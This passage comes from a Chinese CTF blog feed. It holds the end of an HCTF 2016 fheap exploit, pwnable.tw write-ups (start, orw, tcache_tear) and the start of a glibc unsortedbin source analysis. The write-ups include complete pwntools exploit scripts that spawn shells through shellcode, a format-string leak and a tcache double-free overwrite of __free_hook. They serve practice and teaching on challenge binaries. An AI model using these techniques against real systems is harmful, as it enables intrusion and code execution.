class="line">    r.recvuntil(<span class="string">b&#x27;3.quit&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;delete &#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;id:&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;sure?&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;yes&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>(<span class="params"><span class="built_in">breakpoint</span></span>):</span><br><span class="line">    gdb.attach(r, <span class="built_in">breakpoint</span>)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create(<span class="number">4</span>, <span class="string">b&quot;a&quot;</span>)  <span class="comment"># 0</span></span><br><span class="line">create(<span class="number">4</span>, <span class="string">b&quot;b&quot;</span>)  <span class="comment"># 1</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x20</span>, <span class="string">b&#x27;aaaa%176$pyyyy&#x27;</span>.ljust(<span class="number">0x18</span>, <span class="string">b&#x27;c&#x27;</span>) + p8(<span class="number">0xB6</span>))  <span class="comment"># 0</span></span><br><span class="line">dbg(<span class="string">&#x27;b *printf&#x27;</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&quot;aaaa&quot;</span>)</span><br><span class="line">libc_start_main_ret_addr = <span class="built_in">int</span>(r.recvuntil(<span class="string">b&quot;yyyy&quot;</span>, drop=<span class="literal">True</span>), <span class="number">16</span>)</span><br><span class="line">libc_base = libc_start_main_ret_addr-<span class="number">0x20830</span>  <span class="comment"># 本地要-0x10</span></span><br><span class="line">system_addr = libc_base + <span class="number">0x45390</span>  <span class="comment"># 本地要+0x10</span></span><br><span class="line"></span><br><span class="line">log.success(<span class="string">&quot;libc_base: &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">log.success(<span class="string">&quot;sys_addr: &quot;</span> + <span class="built_in">hex</span>(system_addr))</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">b&#x27;&#x27;</span>)  <span class="comment"># 跳过delete函数</span></span><br><span class="line">r.sendline(<span class="string">b&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">create(<span class="number">0x20</span>, <span class="string">b&quot;/bin/sh&quot;</span>.ljust(<span class="number">24</span>, <span class="string">b&quot;p&quot;</span>) + p64(system_addr))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p>似乎还有其他的打法，可以参考下面的链接</p><ul><li><a href="https://www.cnblogs.com/shangye/p/6156391.html">官方解法</a></li><li><a href="https://lantern.cool/wp-item-HCTF-2016-fheap/">Lantern师傅的解法</a></li><li><a href="https://blog.csdn.net/qq_33528164/article/details/79515831">比较详细的WP</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> PWN </tag>
            
            <tag> WP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『pwnable』刷题记录_WP</title>
      <link href="/2024/pwnable-WP/"/>
      <url>/2024/pwnable-WP/</url>
      
        <content type="html"><![CDATA[<h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>pwnable的题挺好玩的，就是难度可能偏高，但是可以练基本功，知道自己的弱项在哪里，所以写WP来做刷题记录。</p><h3 id="0x01-start"><a href="#0x01-start" class="headerlink" title="0x01 start"></a>0x01 start</h3><h5 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h5><p>这篇WP在距离第一次做这题之后一个多月时间又修改了一次，不同的是，这段时间我学了一点汇编，才发现自己之前做题还是处于很懵懂的状态。其实这道题很有意思，程序是用汇编写的，短小精悍，32位无保护。IDA有点无助，如果不熟悉汇编，可以用动调来看发生了什么。从代码上来看，就是两次系统调用，然后就会退出。第一个系统调用显然是write，第二个IDA看不出来，但是从系统调用号（al寄存器处)可以看出来是read函数。</p><p><img src="https://c-lby.top/images/pwnable_wp/start_ida.png" alt="start_ida"></p><p>在准备write之前，程序总共push了6次，第一次是把esp中的地址放到了栈上，然后是_exit函数的地址，接下来连续push五次放的是字符串到栈上。我们知道，每push一次sp寄存器就会自动减一个字长。接下来程序把esp的地址作为起始地址然后打印20个字节，刚好对应五次push的内容。所以如果我们定义字符串最后一个字符的地址是buf，那么esp一开始的地址就是buf+0x1C。</p><p>打印完之后ecx中的内容没变，紧接着就read60个字节。也就是说程序从buf处开始输入60字节，有溢出，因为此时buf距离ret地址只有 0x14。注意，这里和平时我们常接触的C语言编译的程序不太一样，它没有ebp的存在（整个程序都没出现），所以那个offset _exit其实就是返回地址了。我们又知道，ret完后sp寄存器会自动加一个字长，所以ret完后sp寄存器刚好指向一开始写esp值的栈地址。显然这个地址也是个栈地址，所以我们可以控制执行流，让程序返回到0x8048087处更新ecx后打印，这样我们就泄露了栈地址了。</p><p>栈地址有什么用呢？整个程序很简单，也没有后门，也没有libc这一说，所以只能通过syscall来getshell，但是又没有足够的gadget来控制寄存器，所以考虑写shellcode。正好，程序没开NX保护。shellcode只能写到栈上，所以我们需要栈地址。上一步打印完后，程序直接从当前esp处开始输入。但是这里要注意，输入完之后程序依然会执行<code>add esp,14h</code>和<code>retn</code>，所以我们需要利用这个retn返回到shellcode处。所以输入的60字节就被这个ret地址切割成了20字节和36字节。我们很难找到少于20字节的shellcode，所以shellcode要写在24个字节之后。别忘了我们接收到的地址在当前esp的地址还要+4，所以我们要返回的地址是接收到的地址再+20就行了。</p><p>如果不确定我们接收到的地址到底是哪，可以动调看看，然后手算一下。</p><p><img src="https://c-lby.top/images/pwnable_wp/start_gdb.png" alt="start_gdb"></p><h5 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = process(<span class="string">&quot;./start&quot;</span>)</span><br><span class="line"><span class="comment"># r = remote(&quot;chall.pwnable.tw&quot;, 10000)</span></span><br><span class="line">context(log_level=<span class="string">&quot;debug&quot;</span>, arch=<span class="string">&#x27;i386&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">launch_gdb</span>():</span><br><span class="line">    context.terminal == [<span class="string">&#x27;xdce4-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">    gdb.attach(proc.pidof(r)[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">write_addr = <span class="number">0x8048087</span></span><br><span class="line">shellcode = <span class="string">b&#x27;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># launch_gdb()</span></span><br><span class="line">r.recv()</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x14</span>+p32(write_addr)</span><br><span class="line">r.send(payload)</span><br><span class="line">buf_addr = u32(r.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(buf_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x14</span>+p32(buf_addr+<span class="number">0x14</span>)+shellcode</span><br><span class="line">r.send(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="0x02-orw"><a href="#0x02-orw" class="headerlink" title="0x02 orw"></a>0x02 orw</h3><h5 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h5><p><img src="https://c-lby.top/images/pwnable_wp/orw_ida.png" alt="orw_ida"></p><p>程序十分简单，32位，就是开了一个沙盒，然后读取shellcode后执行。题目也已经提示了要用orw。我们直接用seccomp-tools查看沙盒都开了些什么。</p><p><img src="https://c-lby.top/images/pwnable_wp/orw_seccomp.png" alt="orw_seccomp"></p><p>开了些白名单，可以用这些函数，也就是说其他的用不了。程序中read函数可以输入200字节，所以直接使用pwntools的shellcraft工具来生成shellcode就行。&amp;shellcode位于bss段，我们读取的flag也可以存在bss段，注意不要和shellcode有冲突就行。</p><h5 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># r = process(&#x27;./orw&#x27;)</span></span><br><span class="line">r = remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>, <span class="number">10001</span>)</span><br><span class="line"></span><br><span class="line">flag_addr = <span class="number">0x804A060</span>+<span class="number">200</span></span><br><span class="line"></span><br><span class="line">shellcode = shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;/home/orw/flag&#x27;</span>)</span><br><span class="line">shellcode += shellcraft.read(<span class="number">3</span>, flag_addr, <span class="number">100</span>)</span><br><span class="line">shellcode += shellcraft.write(<span class="number">1</span>, flag_addr, <span class="number">100</span>)</span><br><span class="line"><span class="comment"># print(len(asm(shellcode))) #72</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;shellcode:&#x27;</span>)</span><br><span class="line">r.sendline(asm(shellcode))</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="0x03-calc"><a href="#0x03-calc" class="headerlink" title="0x03 calc"></a>0x03 calc</h3><p>单独一篇文章分析</p><h3 id="0x21-tcache-tear"><a href="#0x21-tcache-tear" class="headerlink" title="0x21 tcache_tear"></a>0x21 tcache_tear</h3><h5 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h5><p>题目名字就很明显提示了要用tcachebin attack，给了libc附件，用ROPgadget工具查了一下libc中binsh的偏移，用libcdata网站查出libc是2.27版本的。</p><p><img src="https://c-lby.top/images/pwnable_wp/tcache_tear_libc.png" alt="tcache_tear_libc"></p><p>说到tcache在2.27，我的第一反应就是double free没有任何检查，后面肯定用得上。然后程序一开始就要你往bss段写一个name，info函数也只是把这个name打印出来，肯定有些倪端，应该是要拿来泄露libc地址了。free功能限制了总共只能释放8个chunk，但是有UAF漏洞，为double free奠定了基础。malloc功能限制了大小为0xFF，并且可以写入的字节数为size-0x10，所以没有堆溢出。整个程序只有一个ptr变量用来储存上一个被申请的chunk的指针，所以一旦申请了新的chunk之后，之前申请的chunk就没法再被释放了。</p><p>所以总的思路就是，先泄露libc地址，然后通过double free劫持fd申请chunk到__free_hook，写入system地址后释放一个chunk来getshell，当然这个方式有个前提是在这之前的free不能超过7个；也可以劫持malloc_hook为one_gadget；看到程序当中有个exit本来想着劫持got表为one_gadget，但是看保护开了got表不可写（full relro），所以这个方案没法实现。</p><h5 id="泄露libc"><a href="#泄露libc" class="headerlink" title="泄露libc"></a>泄露libc</h5><p>这道题不止一种泄露方法，这里先看一种，另外一种有时间再试试。其实这题不太好leak。如果有指针变量的话就可以通过got表来泄露，很可惜这里没有。堆题里另一种常见的泄露方式是通过unsorted bin的fd泄露，所以我们可以伪造一个fake chunk释放后进入unsorted bin来打印，显而易见这个chunk要在name处构造，size要在largebin范围，因为smallbin范围会先进入tcachebin。</p><p>释放chunk的时候libc会对chunk有一些检查，我们伪造chunk的话需要绕过这些检查。源码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">   <span class="comment">/* Lightweight tests: check whether the block is already the</span></span><br><span class="line"><span class="comment">      top block.  */</span></span><br><span class="line">   <span class="keyword">if</span> (__glibc_unlikely (p == av-&gt;top))</span><br><span class="line">     malloc_printerr (<span class="string">&quot;double free or corruption (top)&quot;</span>);</span><br><span class="line">   <span class="comment">/* Or whether the next chunk is beyond the boundaries of the arena.  */</span></span><br><span class="line">   <span class="keyword">if</span> (__builtin_expect (contiguous (av)</span><br><span class="line">  &amp;&amp; (<span class="type">char</span> *) nextchunk</span><br><span class="line">  &gt;= ((<span class="type">char</span> *) av-&gt;top + chunksize(av-&gt;top)), <span class="number">0</span>))</span><br><span class="line">malloc_printerr (<span class="string">&quot;double free or corruption (out)&quot;</span>);</span><br><span class="line">   <span class="comment">/* Or whether the block is actually not marked used.  */</span></span><br><span class="line">   <span class="keyword">if</span> (__glibc_unlikely (!prev_inuse(nextchunk)))</span><br><span class="line">     malloc_printerr (<span class="string">&quot;double free or corruption (!prev)&quot;</span>);</span><br><span class="line"></span><br><span class="line">   nextsize = chunksize(nextchunk);</span><br><span class="line">   <span class="keyword">if</span> (__builtin_expect (chunksize_nomask (nextchunk) &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">|| __builtin_expect (nextsize &gt;= av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">     malloc_printerr (<span class="string">&quot;free(): invalid next size (normal)&quot;</span>);</span><br><span class="line">   <span class="comment">/*这部分没有注释，但是一个chunk下面要么是另一个chunk要么是top chunk，所以检查一下很正常*/</span></span><br><span class="line"></span><br><span class="line">   free_perturb (chunk2mem(p), size - <span class="number">2</span> * SIZE_SZ);</span><br></pre></td></tr></table></figure><p>总而言之就是，libc会检查被释放的chunk的下一个chunk和下下个chunk的size字段，所以总的来说要伪造三个chunk，size字段分别为0x501,0x21,0x21就可以了。0x501在程序一开始就写入，下面两个size字段就需要通过double free申请到name+0x500处写入。这里要注意一个问题，我们可以同时写入下面两个chunk，总共需要写入<code>8*4*2</code>个字节，但是申请一个chunk的时候只能写入size-0x10个字节，所以我们double free的size至少要0x50。</p><p>然后第二次double free就申请到name+0x10处（tcachebin链表存的是mem地址），然后释放掉之后0x501size的chunk就会进入unsorted bin，然后fd就是一个和main_arena有固定偏移的地址，打印出来就可以计算出libc地址。</p><p>代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">r.recvuntil(<span class="string">b&#x27;Name:&#x27;</span>)</span><br><span class="line">r.sendline(p64(<span class="number">0</span>)+p64(<span class="number">0x501</span>))</span><br><span class="line">add(<span class="number">0x50</span>)</span><br><span class="line">delete()</span><br><span class="line">delete()</span><br><span class="line">add(<span class="number">0x50</span>, p64(name_addr+<span class="number">0x500</span>))</span><br><span class="line">add(<span class="number">0x50</span>)</span><br><span class="line">add(<span class="number">0x50</span>, flat(<span class="number">0</span>, <span class="number">0x21</span>, <span class="number">0</span>, <span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x70</span>)</span><br><span class="line">delete()</span><br><span class="line">delete()</span><br><span class="line">add(<span class="number">0x70</span>, p64(name_addr+<span class="number">0x10</span>))</span><br><span class="line">add(<span class="number">0x70</span>)</span><br><span class="line">add(<span class="number">0x70</span>, <span class="string">b&#x27;deadbeef&#x27;</span>)</span><br><span class="line">delete()</span><br><span class="line">info()</span><br><span class="line"><span class="comment"># print(r.recv())</span></span><br><span class="line">libc_address = u64(r.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x3ebca0</span> </span><br><span class="line"><span class="comment"># 0x3ebca0 偏移可以通过2.27版本关键词在网上查到</span></span><br><span class="line">log.success(<span class="string">&#x27;libc_addr:&#x27;</span>+<span class="built_in">hex</span>(libc_address))</span><br></pre></td></tr></table></figure><h5 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment"># r = process(&#x27;./tcache_tear&#x27;)</span></span><br><span class="line">r = remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>, <span class="number">10207</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./tcache_tear&#x27;</span>)</span><br><span class="line"></span><br><span class="line">name_addr = <span class="number">0x602060</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">choice</span>):</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(choice).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content=<span class="string">b&#x27;aaaaaaaa&#x27;</span></span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Size:&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Data:&#x27;</span>)</span><br><span class="line">    r.send(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>():</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">info</span>():</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exit</span>():</span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Name:&#x27;</span>)</span><br><span class="line">r.sendline(p64(<span class="number">0</span>)+p64(<span class="number">0x501</span>))</span><br><span class="line">add(<span class="number">0x50</span>)</span><br><span class="line">delete()</span><br><span class="line">delete()</span><br><span class="line">add(<span class="number">0x50</span>, p64(name_addr+<span class="number">0x500</span>))</span><br><span class="line">add(<span class="number">0x50</span>)</span><br><span class="line">add(<span class="number">0x50</span>, flat(<span class="number">0</span>, <span class="number">0x21</span>, <span class="number">0</span>, <span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x70</span>)</span><br><span class="line">delete()</span><br><span class="line">delete()</span><br><span class="line">add(<span class="number">0x70</span>, p64(name_addr+<span class="number">0x10</span>))</span><br><span class="line">add(<span class="number">0x70</span>)</span><br><span class="line">add(<span class="number">0x70</span>, <span class="string">b&#x27;deadbeef&#x27;</span>)</span><br><span class="line">delete()</span><br><span class="line">info()</span><br><span class="line"><span class="comment"># print(r.recv())</span></span><br><span class="line">libc_address = u64(r.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x3ebca0</span></span><br><span class="line">log.success(<span class="string">&#x27;libc_addr:&#x27;</span>+<span class="built_in">hex</span>(libc_address))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x90</span>)</span><br><span class="line">delete()</span><br><span class="line">delete()</span><br><span class="line">add(<span class="number">0x90</span>, p64(libc_address+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]))</span><br><span class="line">add(<span class="number">0x90</span>)</span><br><span class="line">add(<span class="number">0x90</span>, p64(libc_address+libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0xb0</span>, <span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">delete()</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> PWN </tag>
            
            <tag> WP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『glibc源码补完计划』UnsortedBin</title>
      <link href="/2024/glibc-unsortedbin/"/>
      <url>/2024/glibc-unsortedbin/</url>
      
        <content type="html"><![CDATA[<h2 id="UnsortedBin"><a href="#UnsortedBin" class="headerlink" title="UnsortedBin"></a>UnsortedBin</h2><p>最近学习堆题的时候接触到了unsortedbin的利用，感觉还挺有意思的，所以先把它的源码读了，方便以后构建利用思路。之所以这里分析glibc2.23的代码而非2.35的代码，是因为从2.29开始，unsortedbin加入了一坨检查机制以至于它在高版本下难以被攻击，所以索性读低版本的了。</p><p>glibc2.23在unsortedbin中取chunk的时候的检查：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)|| __builtin_expect (victim-&gt;size &gt; av&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">            malloc_printerr (check_action, <span class="string">&quot;malloc(): memory corruption&quot;</span>,chunk2mem (victim), av);</span><br></pre></td></tr></table></figure><p>glibc2.29对unsortedbin链表完整性的检查：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">bck = victim-&gt;bk;</span><br><span class="line">       size = chunksize (victim);</span><br><span class="line">       mchunkptr next = chunk_at_offset (victim, size);</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (__glibc_unlikely (size &lt;= <span class="number">2</span> * SIZE_SZ)</span><br><span class="line">           || __glibc_unlikely (size &gt; av-&gt;system_mem))</span><br><span class="line">         malloc_printerr (<span class="string">&quot;malloc(): invalid size (unsorted)&quot;</span>);</span><br><span class="line">       <span class="keyword">if</span> (__glibc_unlikely (chunksize_nomask (next) &lt; <span class="number">2</span> * SIZE_SZ)</span><br><span class="line">           || __glibc_unlikely (chunksize_nomask (next) &gt; av-&gt;system_mem))</span><br><span class="line">         malloc_printerr (<span class="string">&quot;malloc(): invalid next size (unsorted)&quot;</span>);</span><br><span class="line">       <span class="keyword">if</span> (__glibc_unlikely ((prev_size (next) &amp; ~(SIZE_BITS)) != size))</span><br><span class="line">         malloc_printerr (<span class="string">&quot;malloc(): mismatching next-&gt;prev_size (unsorted)&quot;</span>);</span><br><span class="line">       <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim)</span><br><span class="line">           || __glibc_unlikely (victim-&gt;fd != unsorted_chunks (av)))</span><br><span class="line">         malloc_printerr (<span class="string">&quot;malloc(): unsorted double linked list corrupted&quot;</span>);</span><br><span class="line">       <span class="keyword">if</span> (__glibc_unlikely (prev_inuse (next)))</span><br><span class="line">         malloc_printerr (<span class="string">&quot;malloc(): invalid next-&gt;prev_inuse (unsorted)&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="Unsorted-Bin的基本情况-对一些变量的理解"><a href="#Unsorted-Bin的基本情况-对一些变量的理解" class="headerlink" title="Unsorted Bin的基本情况 &amp; 对一些变量的理解"></a>Unsorted Bin的基本情况 &amp; 对一些变量的理解</h3><p>当用户申请一块堆内存的时候，malloc会先去fast bin里找适合的chunk，如果没有则去找small bin，如果还没有这才去找unsorted bin。也就是说如果考虑unsorted bin attack，那就要先考虑到前面两个bin的影响。unsorted bin是一个双向链表，取放的原则是FIFO。最先放入的chunk我们叫尾部，最后放入的叫头部，取出chunk的时候是从尾部取的。</p><p><code>unsorted_chunks(av)</code>: unsorted bin的堆头。unsorted bin一旦被使用，就会初始化这个堆头，它和main_arena在相同glibc版本下有着固定偏移（比如glibc2.23中是main_arena+0x58）。<br><code>av</code>: 一个指向当前arena地址的指针，也就是指向分配区的指针。<br><code>victim</code>: 指当前unsorted bin链表中处于尾部的chunk。<br><code>bck</code>: victim的上一个chunk。<br><code>nb</code>: 用户申请的chunk大小，包括了维护chunk的0x10结构部分。<br><code>remainder</code>: unsorted bin中的chunk被切割后剩下的部分。<br><code>last_remainder</code>: 最后一次被切割的chunk剩下的部分。</p><p>Unsorted Bin由一个循环的双向链表维护，也就是说，链表的头部chunk的bk会指向堆头，而尾部chunk的fd也会指向堆头，如下图所示（chunk0先被释放可看做尾部，chunk1后被释放可看做头部）：</p><p><img src="https://c-lby.github.io/images/glibc_unsortedbin/unsortedbin%E5%BE%AA%E7%8E%AF%E9%93%BE%E8%A1%A8.png" alt="unsortedbin循环链表"></p><p>不难想象，如果unsorted bin中只含有一个chunk，那么这个chunk的fd和bk都会指向堆头，堆头的fd和bk都会指向这个chunk。</p><h3 id="malloc时unsorted-bin的行为"><a href="#malloc时unsorted-bin的行为" class="headerlink" title="malloc时unsorted bin的行为"></a>malloc时unsorted bin的行为</h3><p>接下来我们将源码分段来分析。以下分析顺序基于unsorted bin的行为顺序。</p><h5 id="一些基本检查"><a href="#一些基本检查" class="headerlink" title="一些基本检查"></a>一些基本检查</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (;; 